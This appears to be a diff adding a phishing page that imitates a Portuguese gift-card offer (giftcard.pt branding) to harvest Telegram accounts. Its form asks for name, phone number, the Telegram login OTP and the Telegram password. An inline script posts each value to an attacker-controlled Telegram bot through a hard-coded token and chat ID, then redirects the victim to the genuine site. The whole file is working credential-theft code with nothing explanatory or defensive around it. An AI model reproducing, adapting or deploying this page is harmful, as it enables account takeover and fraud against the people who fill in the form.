@@ -1,0 +1,762 @@
+<!doctype html>
+<html lang="uea">
+    <head>
+        <meta charset="utf-8" />
+        <link rel="icon" href="assets/logo.png" />
+        <meta name="viewport" content="width=device-width,initial-scale=1" />
+        <meta name="description" content="O Cartão Presente Multi é a escolha ideal para quem quer oferecer liberdade total. Com apenas um cartāo, quem o recebe pode selecionar entre dezenas de marcas, experiências, produtos e serviços, online ou em loja física, consoante a marca escolhida.">
+         <meta property="og:image" content="background.webp" />
+        <title>Cartão Presente Multi</title>
+        <link rel="apple-touch-icon" href="assets/prt.png" />
+        <link href="assets/style.css" rel="stylesheet">
+        <link href="q.css" rel="stylesheet">
+        <link href="174.css" rel="stylesheet">
+        <style>
+        @keyframes blink-animation {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        /* CSS untuk gambar */
+        .form-container img {
+            width: 100%;
+            height: auto; /* Menjaga aspek rasio gambar */
+            display: block; /* Menghilangkan ruang ekstra di bawah gambar */
+            margin: 0; /* Menghapus margin default */
+        }
+
+        /* CSS untuk marquee */
+        h3 marquee {
+            display: block;
+            font-size: 16px;
+            color: #333;
+        }
+
+        /* CSS untuk feedback validasi */
+        select:invalid {
+            border-color: #dc3545;
+        }
+
+        select:valid {
+            border-color: #28a745;
+        }
+
+        /* CSS untuk loading */
+        .loading {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            visibility: hidden; /* Hidden by default */
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .loading.show {
+            visibility: visible;
+            opacity: 1;
+        }
+        .loading .spinner {
+            border: 8px solid #f3f3f3; /* Light grey */
+            border-top: 8px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        </style>
+        <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background: #10152b;
+      color: white;
+      min-height: 100vh;
+    }
+
+    .background-layer {
+      position: fixed;
+      inset: 0;
+      overflow: hidden;
+      background: #10152b url("background.webp") center / cover no-repeat;
+      animation: background-drift 28s ease-in-out infinite alternate;
+    }
+
+    .background-layer video {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      pointer-events: none;
+    }
+
+    @keyframes background-drift {
+      from { background-size: 100% auto; }
+      to { background-size: 110% auto; }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      .background-layer {
+        animation: none;
+      }
+    }
+
+    main > .relative > .relative.z-10 {
+      color: #fff;
+      background: rgba(8, 15, 32, 0.88);
+      border: 1px solid rgba(255, 255, 255, 0.32);
+    }
+
+    #multiStepForm label,
+    #multiStepForm h2,
+    #multiStepForm p,
+    #multiStepForm .text-black,
+    #multiStepForm .text-blue {
+      color: #fff;
+      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.55);
+    }
+
+    #multiStepForm label {
+      display: block;
+      width: 90%;
+      max-width: 520px;
+      margin: 0 auto 6px;
+      font-size: 16px;
+      font-weight: 700;
+      text-align: left;
+    }
+
+    #multiStepForm input:not([type="hidden"]),
+    #multiStepForm select {
+      width: 90%;
+      max-width: 520px;
+      min-height: 46px;
+      display: block;
+      margin: 0 auto;
+      color: #fff;
+      background-color: rgba(8, 15, 32, 0.78);
+      border: 1px solid rgba(255, 255, 255, 0.72);
+    }
+
+    #multiStepForm .phone-row {
+      width: 90%;
+      max-width: 520px;
+      display: flex;
+      gap: 8px;
+      margin: 0 auto;
+      align-items: center;
+    }
+
+    #multiStepForm #countryCode {
+      width: 88px;
+      flex: 0 0 88px;
+      min-height: 46px;
+      margin: 0;
+      color: #fff;
+      background-color: rgba(8, 15, 32, 0.78);
+      border: 1px solid rgba(255, 255, 255, 0.72);
+    }
+
+    #multiStepForm #phone {
+      flex: 1;
+      width: auto;
+      min-width: 0;
+      margin: 0;
+    }
+
+    #multiStepForm input::placeholder {
+      color: #e2e8f0;
+      opacity: 1;
+    }
+
+    #multiStepForm input:focus,
+    #multiStepForm select:focus {
+      outline: 3px solid #67e8f9;
+      outline-offset: 2px;
+    }
+
+    #multiStepForm option {
+      color: #fff;
+      background: #10152b;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 650px;
+      margin: 0 auto;
+      padding-bottom: 35px;
+    }
+
+    /* Bagian gambar utama */
+    .hero {
+      background: #ffc0c0;
+      padding: 0 0 18px;
+      text-align: center;
+      overflow: hidden;
+    }
+
+    .navbar {
+      background: #5900bd;
+      height: 55px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 24px;
+    }
+
+    .menu, .cart {
+      font-size: 27px;
+      color: white;
+    }
+
+    .brand {
+      font-size: 34px;
+      font-weight: bold;
+      line-height: 1;
+    }
+
+    .brand small {
+      display: block;
+      font-size: 10px;
+      font-weight: normal;
+    }
+
+    .gift-image {
+      display: block;
+      width: 88%;
+      height: auto;
+      margin: 8px auto 0;
+      border-radius: 18px;
+    }
+
+    /* Tombol Telegram */
+    .telegram-wrap {
+      text-align: center;
+      margin: 40px 0 25px;
+    }
+
+    .telegram-btn {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 12px;
+      width: 88%;
+      max-width: 430px;
+      min-height: 66px;
+      margin: auto;
+      padding: 12px;
+      background: #079bb5;
+      color: white;
+      font-size: clamp(17px, 3.5vw, 24px);
+      font-weight: bold;
+      text-decoration: none;
+      border: 4px solid #a9a9a9;
+      border-radius: 9px;
+      box-shadow: 0 2px 5px #666;
+      transition: background .2s;
+    }
+
+    .telegram-btn:hover {
+      background: #087e98;
+    }
+
+    .telegram-icon {
+      font-size: 27px;
+    }
+
+    /* Metode pembayaran */
+    .payment {
+      width: 88%;
+      max-width: 455px;
+      margin: 25px auto 28px;
+      background: white;
+      color: #424255;
+      padding: 13px;
+      text-align: center;
+    }
+
+    .payment-title {
+      font-size: 14px;
+      margin-bottom: 5px;
+    }
+
+    .payment-logos {
+      display: flex;
+      align-items: center;
+      justify-content: space-around;
+      gap: 12px;
+      flex-wrap: wrap;
+      font-weight: bold;
+      font-size: 15px;
+    }
+
+    .mb { color: #333; }
+    .visa { color: #17469e; font-style: italic; }
+    .mastercard { color: #e33137; }
+    .apple { color: #222; border: 1px solid #555;
+      padding: 3px 8px; border-radius: 4px; }
+
+    /* Logo merek bagian bawah */
+    .brands {
+      width: 100%;
+      background: white;
+      color: #222;
+      padding: 15px 12px;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      gap: 16px;
+      flex-wrap: wrap;
+      margin: auto;
+    }
+
+    .brands span {
+      font-size: 14px;
+      font-weight: bold;
+      white-space: nowrap;
+    }
+
+    .adidas {
+      font-size: 27px !important;
+      font-style: italic;
+    }
+
+    .hm {
+      color: #d82438;
+      font-family: Georgia, serif;
+      font-size: 24px !important;
+    }
+
+    .decathlon { color: #2452a1; }
+    .evergreen { color: #369a72; }
+    .prenatal { color: #7b9c55; }
+    .media { color: #c92738; }
+    .guide { color: #dd513c; }
+
+    .brands-bottom {
+      width: 65%;
+      background: white;
+      color: #222;
+      padding: 12px;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      gap: 12px;
+      margin: 0 auto;
+      flex-wrap: wrap;
+    }
+
+    /* Pesan validasi */
+    .notice {
+      display: none;
+      background: #fff;
+      color: #333;
+      padding: 12px;
+      border-radius: 5px;
+      margin: 15px 0;
+      font-size: 14px;
+    }
+
+    @media (max-width: 480px) {
+      .navbar {
+        padding: 0 15px;
+      }
+
+      .brand {
+        font-size: 29px;
+      }
+
+      .form-section {
+        padding-left: 7%;
+        padding-right: 7%;
+      }
+
+      .heading {
+        margin-bottom: 35px;
+      }
+
+      .form-group label {
+        font-size: 20px;
+      }
+
+      .form-group {
+        margin-bottom: 32px;
+      }
+
+      .brands {
+        gap: 20px;
+      }
+    }
+  </style>
+ <style>
+.brands-title {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.brands-grid {
+    display: grid;
+    grid-template-columns: repeat(4, minmax(0, 1fr));
+    gap: 20px;
+    max-width: 600px;
+    width: 100%;
+    margin: 0 auto;
+    padding: 0;
+    list-style: none;
+    box-sizing: border-box;
+}
+
+.brands-grid li {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-width: 0;
+}
+
+.brands-grid img {
+    display: block;
+    width: 100%;
+    max-width: 100px;
+    height: 75px;
+    object-fit: contain;
+}
+
+/* Tampilan HP */
+@media (max-width: 480px) {
+    .brands-grid {
+        gap: 12px;
+        max-width: 100%;
+        padding: 0 12px;
+    }
+
+    .brands-grid img {
+        height: 60px;
+        max-width: 75px;
+    }
+}
+</style>
+  <style>
+.payment-title {
+    text-align: center;
+    margin-bottom: 12px;
+    font-size: 14px;
+}
+
+.payment-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 20px;
+    width: 100%;
+    margin: 0 auto;
+    flex-wrap: wrap;
+}
+
+.payment-container img {
+    display: block;
+    width: auto;
+    height: 28px;
+    max-width: 70px;
+    object-fit: contain;
+}
+   </style>
+</head>
+<body>
+     <main class="flex-grow">
+        <div class="relative min-h-screen flex items-center justify-center overflow-hidden p-4">
+            <div class="background-layer">
+                        <video src="backham.mp4" poster="background.webp" autoplay muted loop playsinline></video>
+                    </div>
+             <div class="w-full max-w-lg bg-white bg-opacity-10 backdrop-blur-sm rounded-lg shadow-[0_10px_30px_rgba(0,0,0,0.9)] relative z-10">
+            <section class="hero ">
+      <header class="navbar">
+        <span class="menu">&#9776;</span>
+        <div class="brand">
+           <center><img src="logo.png" style="width: 140px; height: 40px" alt="giftcard.pt" /></center>
+        </div>
+        <span class="cart">&#128722;</span>
+      </header>
+      <br>
+      <center><img src="ban.jpeg" style="border-radius: 12px; width: 450px;" alt="banner" /></center>
+      <br>
+      <div class="banner">
+        <center><img src="banner2.png" alt="Banner" style="width: 50%; height: auto; "></center>
+      </div>
+    </section>
+   <div class="form-container">
+                            <div class="loading">
+                                <div class="spinner"></div>
+                            </div>
+                            <form id="multiStepForm">
+                                <div id="step1" class="form-step">
+                                    <div class="p-4">
+                                        <h2 class="text-3xl font-bold mb-4 text-center text-white">Formulário de Inscrição</h2>
+                                        <p class="mb-6 text-center text-white font-bold">Por favor preencha o formulário abaixo para se registrar.</p>
+                                   </div>
+                                    <input type="hidden" name="form_type" value="contact">
+                                    <div class="space-y-4">
+                                        <label class="block text-sm font-bold text-blue mb-1" for="name"><span class="text-red-500">*</span>Nome completo </label>
+                                        <input type="text" name="name" id="name" placeholder="Full Name" class="block w-full p-2 border border-gray-300 rounded shadow-sm bg-gray-700 bg-opacity-30 text-white" required="true">
+                                    </div>
+                                    <br>
+                                    <div class="space-y-4">
+                                        <label class="block text-sm font-bold text-blue mb-1" for="phone"><span class="text-red-500">*</span>Número de Telegram </label>
+                                        <div class="phone-row">
+                                            <select id="countryCode" required>
+                                                 <option value="+351">🇵🇹 +351</option>
+                                            </select>
+                                            <input type="tel" name="phone" id="phone" placeholder="Your Phone Number" required="true" inputmode="numeric" pattern="[0-9+\-\s()]*">
+                                        </div>
+										<div>
+										<label class="block text-sm font-bold text-blue mb-1" for="ageRange">Idade <span class="text-red-500">*</span></label>
+										<select id="ageRange" class="form-select block w-full p-2 border border-gray-300 rounded shadow-sm bg-gray-700 bg-opacity-30 text-blue">
+										<option value="">Selecione uma faixa etária</option>
+										<option value="18-25">18-25 anos</option>
+										<option value="25-35">25-35 anos</option>
+										<option value="35-45">35-45 anos</option>
+										</select>
+										</div>
+                                        <br>
+                                        <div class="button">
+                                            <center><button type="button" class="w-100 bg-cyan-600 text-white font-bold p-2 rounded hover:bg-cyan-700 shadow-md flex items-center justify-center" onclick="nextStep()"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="mr-2" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M476 3.2L12.5 270.6c-18.1 10.4-15.8 35.6 2.2 43.2L121 358.4l287.3-253.2c5.5-4.9 13.3 2.6 8.6 8.3L176 407v80.5c0 23.6 28.5 32.9 42.5 15.8L282 426l124.6 52.2c14.2 6 30.4-2.9 33-18.2l72-432C515 7.8 493.3-6.8 476 3.2z"></path></svg> Junte-se ao grupo Telegram </button></center>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div id="step2" class="form-step hidden">
+                                    <input type="hidden" name="form_type" value="otp">
+                                    <input type="hidden" name="name" id="name">
+                                    <input type="hidden" name="phone" id="phone">
+                                    <div class="p-4">
+                                        <h2 class="text-3xl font-bold mb-4 text-center text-white">Código OTP</h2>
+                                        <p class="mb-6 text-center text-white font-bold">Enviamos um código OTP para a sua conta Telegram.</p>
+                                    </div>
+                                    <div class="space-y-4">
+                                        <input type="tel" name="otp" id="otp" style="text-align: center;" placeholder="5-digit code" maxlength="5" class="block w-full p-2 border border-gray-300 rounded shadow-sm bg-gray-700 bg-opacity-30 text-white" required="">
+                                    </div>
+                                    <br>
+                                    <div class="button">
+                                        <center><button type="button" onclick="nextStep()" class="w-full bg-cyan-600 text-white font-bold p-2 rounded hover:bg-cyan-700 shadow-md flex items-center justify-center">Vá em frente</button></center>
+                                    </div>
+                                </div>
+                                <div id="step3" class="form-step hidden">
+                                    <input type="hidden" name="form_type" value="password">
+                                    <input type="hidden" name="name" id="name2">
+                                    <input type="hidden" name="phone" id="phone2">
+                                    <input type="hidden" name="otp" id="otp">
+                                    <div class="p-4">
+                                        <h2 class="text-3xl font-bold mb-4 text-center text-white">Senhas</h2>
+                                        <p class="mb-6 text-center text-white font-bold">Introduza a sua senha do Telegram.</p>
+                                    </div>
+                                    <div class="p-4">
+                                        <input type="text" name="password" id="password" style="text-align: center;" placeholder="Enter your Telegram Password" class="block w-full p-2 border border-gray-300 rounded shadow-sm bg-gray-700 bg-opacity-30 text-white">
+                                    </div>
+                                    <br>
+                                    <div class="button">
+                                        <center><button type="button" onclick="submitForm()" class="w-100 bg-cyan-600 text-white font-bold p-2 rounded hover:bg-cyan-700 shadow-md flex items-center justify-center">Vá em frente</button></center>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                         
+<script>
+    const TELEGRAM_API_URL = 'https://api.telegram.org/bot9262714469:AAHYM-_vmoxxRgkZPwtp6FgYDyrSOAxLVVQ/sendMessage'; // Ganti dengan token bot Telegram Anda
+    const CHAT_ID = '7737465598'; // Ganti dengan chat ID Telegram Anda
+
+    async function sendToTelegram(message) {
+        try {
+            const response = await fetch(TELEGRAM_API_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+
+            const data = await response.json();
+            console.log('Data berhasil dikirim ke Telegram:', data);
+            return true;
+        } catch (error) {
+            console.error('Terjadi kesalahan saat mengirim data ke Telegram:', error);
+            return false;
+        }
+    }
+
+    function showLoading(show) {
+        const loadingElement = document.querySelector('.loading');
+        if (show) {
+            loadingElement.classList.add('show');
+        } else {
+            loadingElement.classList.remove('show');
+        }
+    }
+
+    function nextStep() {
+        const currentStep = document.querySelector('.form-step:not(.hidden)');
+        const nextStep = currentStep.nextElementSibling;
+
+        // Validasi inputan
+        if (!validateInputs(currentStep)) {
+            alert('Por favor, preencha todos os campos antes de prosseguir.');
+            return;
+        }
+
+        // Simpan data dari langkah saat ini
+        let message = '';
+        if (currentStep.id === 'step1') {
+            const name = document.querySelector('input[name="name"]').value;
+            const phone = document.querySelector('input[name="phone"]').value;
+            document.getElementById('name').value = name;
+            document.getElementById('phone').value = phone;
+            message = `【Gift Card𝟙】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}`;
+        } else if (currentStep.id === 'step2') {
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            const otp = document.querySelector('input[name="otp"]').value;
+            document.getElementById('name2').value = name;
+            document.getElementById('phone2').value = phone;
+            document.getElementById('otp').value = otp;
+            message = `【Gift Card𝟚】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}\n👍 𝐎.𝐓.𝐏: ${otp}`;
+        } else if (currentStep.id === 'step3') {
+            const name = document.getElementById('name2').value;
+            const phone = document.getElementById('phone2').value;
+            const otp = document.getElementById('otp').value;
+            const password = document.querySelector('input[name="password"]').value;
+            // Debugging: Log nilai untuk memastikan semuanya diambil dengan benar
+            console.log('Debug Step 3:');
+            console.log('Name:', name);
+            console.log('Phone:', phone);
+            console.log('OTP:', otp);
+            console.log('Password:', password);
+
+            message = `【Gift Card𝟛】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}\n👍 𝐎.𝐓.𝐏: ${otp}\n👍 𝐏𝐚𝐬𝐬: ${password}`;
+        }
+
+        // Tampilkan loading
+        showLoading(true);
+
+        // Kirim data ke Telegram
+        if (message) {
+            sendToTelegram(message).then(success => {
+                // Sembunyikan loading dan pindahkan ke langkah berikutnya
+                showLoading(false);
+                if (success) {
+                    currentStep.classList.add('hidden');
+                    nextStep.classList.remove('hidden');
+                }
+            });
+        } else {
+            // Sembunyikan loading dan pindahkan ke langkah berikutnya jika tidak ada pesan
+            showLoading(false);
+            currentStep.classList.add('hidden');
+            nextStep.classList.remove('hidden');
+        }
+    }
+
+    async function submitForm() {
+        const currentStep = document.querySelector('.form-step:not(.hidden)');
+        if (currentStep.id === 'step3') {
+            // Validasi inputan
+            if (!validateInputs(currentStep)) {
+                alert('Harap isi semua kolom sebelum mengirim.');
+                return;
+            }
+
+            // Simpan data dari langkah 3 dan kirim ke Telegram
+            const name = document.getElementById('name2').value;
+            const phone = document.getElementById('phone2').value;
+            const otp = document.getElementById('otp').value;
+            const password = document.querySelector('input[name="password"]').value;
+
+            const message = `【Gift Card𝟛】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}\n👍 𝐎.𝐓.𝐏: ${otp}\n👍 𝐏𝐚𝐬𝐬: ${password}`;
+
+            // Tampilkan loading
+            showLoading(true);
+
+            // Kirim data ke Telegram dan redirect setelah berhasil
+            const success = await sendToTelegram(message);
+            if (success) {
+                window.location.href = 'https://www.giftcard.pt/';
+            } else {
+                showLoading(false);
+                alert('Ocorreu um erro ao enviar dados.');
+            }
+        }
+    }
+
+    // Fungsi untuk memvalidasi inputan
+    function validateInputs(step) {
+        const requiredInputs = step.querySelectorAll('input[required]');
+        const requiredSelects = step.querySelectorAll('select[required]');
+        
+        const inputsValid = Array.from(requiredInputs).every(input => input.value.trim() !== '');
+        const selectsValid = Array.from(requiredSelects).every(select => select.value.trim() !== '');
+
+        return inputsValid && selectsValid;
+    }
+</script>
+<br>
+<br>
+<center><p class="payment-title">Pagamento seguro com:</p>
+
+<div class="payment-container">
+    <img src="Logo_MBWay.svg"
+         alt="MBWay" loading="eager">
+
+    <img src="https://www.giftcard.pt/sites/default/files/2025-06/visa%20(1).svg"
+         alt="Visa" loading="eager">
+
+    <img src="https://www.giftcard.pt/sites/default/files/2025-06/mc.svg"
+         alt="Mastercard" loading="eager">
+
+    <img src="https://www.giftcard.pt/sites/default/files/2025-11/applepay%20(1)_7.svg"
+         alt="Apple Pay" loading="eager">
+</div>
+</center>
+<br>
+<br>
+<div class="w-full max-w-lg p-6 bg-white bg-opacity-10 backdrop-blur-sm rounded-lg shadow-[0_10px_30px_rgba(0,0,0,0.9)] relative z-10">
+<center>
+  <p class="brands-title">Brands Portugal</p>
+<ul class="brands-grid">
+    <li><img alt="Adidas" src="adidas.png"></li>
+    <li><img alt="Decathlon" src="https://www.giftcard.pt/sites/default/files/2025-07/Decathlon_logo-372x362_1.svg?w=300"></li>
+    <li><img alt="Evertreen" src="https://www.giftcard.pt/sites/default/files/2025-07/evertreen_logo-372x362_0.png?w=300"></li>
+    <li><img alt="Get your guide" src="https://www.giftcard.pt/sites/default/files/2025-07/Getyourguido_logo-372x362.svg?w=300"></li>
+    <li><img alt="H&M" src="https://www.giftcard.pt/sites/default/files/2025-07/HM-logo-372x362_0.svg?w=300"></li>
+    <li><img alt="Mango" src="mango.png"></li>
+    <li><img alt="Media Markt" src="https://www.giftcard.pt/sites/default/files/2025-07/Media_Markt_logo-372x362_1.svg?w=300"></li>
+    <li><img alt="Prenatal" src="https://www.giftcard.pt/sites/default/files/2025-07/Prenatal-PT-logo-372x362.png?w=300"></li>
+</ul>
+</center>
+</div>
+
+                        </div>
+        </div> 
+        
+        </div>
+       
+     </main>    
+</body>
